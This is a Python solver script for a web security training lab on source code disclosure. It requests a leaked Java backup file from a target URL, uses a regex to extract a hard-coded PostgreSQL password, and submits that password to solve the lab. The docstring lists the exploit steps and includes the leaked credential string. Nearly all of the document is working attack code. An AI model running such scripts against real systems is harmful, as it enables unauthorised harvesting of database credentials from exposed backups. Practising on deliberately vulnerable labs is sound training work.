"""
    Lab: Source code disclosure via backup files

    This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code.

    Exploit Steps:
    1. GET /backup/ProductTemplate.java.bak
    2. Parser the database password from the response: 
        "postgres",
        "laqo42hk10l04ughpfs7ha2dtv4fhvow"
    ).withAutoCommit();
    3. Submit the extracted database password using the button provided in the lab banner.

    Author: N00BCYB0T
"""
import argparse
import re
import time
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0:1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Starting source code disclosure attack...{Fore.RESET}")

    message = get_backup_file(session)
    if message:
        db_password = get_db_password(message)
        if db_password:
            print(f"{Fore.GREEN}[+] Found database password: {db_password}{Fore.RESET}")
            submit_solution(session, db_password)
        else:
            print(f"{Fore.RED}[-] Could not parse database password from backup file{Fore.RESET}")

def get_backup_file(session):
    print(f"{Fore.YELLOW}[*] Accessing backup file...{Fore.RESET}")
    r = session.get(f"{URL}/backup/ProductTemplate.java.bak")
    if r.status_code == 200:
        return r.text
    return None

def get_db_password(message):
    match = re.search(r'"postgres",\s*"([^"]+)"\s*\)\.withAutoCommit\(\);', message)
    if match:
        return match.group(1)
    return None

def submit_solution(session, password):
    print(f"{Fore.YELLOW}[*] Submitting solution...{Fore.RESET}")
    r = session.get(f"{URL}/?solution={password}")
    time.sleep(5)  # Wait for the server to process the solution
    if "Congratulations, you solved the lab!" in r.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

if __name__ == "__main__":
    main()